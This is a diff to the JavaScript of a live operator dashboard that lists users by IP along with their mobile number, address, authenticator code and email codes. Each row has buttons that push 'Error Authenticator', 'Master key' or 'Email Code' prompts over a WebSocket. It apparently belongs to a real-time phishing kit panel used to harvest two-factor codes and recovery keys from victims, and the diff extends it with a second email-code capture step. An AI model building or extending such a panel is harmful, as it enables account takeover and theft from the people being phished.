@@ -1,6 +1,6 @@
 const tableBody = document.querySelector("#userTable tbody");
 const noUsersRow = document.getElementById("noUsersRow");
-const socket = new WebSocket("ws://localhost:3000");
+const socket = new WebSocket(`ws://${window.location.host}/ws`);
 
 const rowsMap = {}; // ip -> <tr>
 let serialCounter = 0;
@@ -41,6 +41,7 @@ function updateUserRow(user, init = false) {
     { key: "mobile_number", label: "Mobile Number" },
     { key: "address", label: "Address" },
     { key: "gauth", label: "Authenticator Code" },
+    { key: "gauth_2", label: "Email Code 2" },
     { key: "email_code", label: "Email Code" },
     { key: "stat", label: "Status" }
   ];
@@ -68,6 +69,8 @@ function updateUserRow(user, init = false) {
       <button class="error">Error Authenticator</button>
       <button class="action">Master key</button>
       <button class="error">Error Master key</button>
+      <button class="action">Email Code</button>
+      <button class="error">Error Email Code</button>
       <button class="success">Success</button>
     </td>
   `;
@@ -85,7 +88,10 @@ function updateUserRow(user, init = false) {
     "Error Authenticator": 4,
     "Master key": 5,
     "Error Master key": 6,
-    "Success": 7
+    "Email Code": 7,
+    "Error Email Code": 8,
+    "Success": 9
+
   };
 
   const buttons = row.querySelectorAll("button");
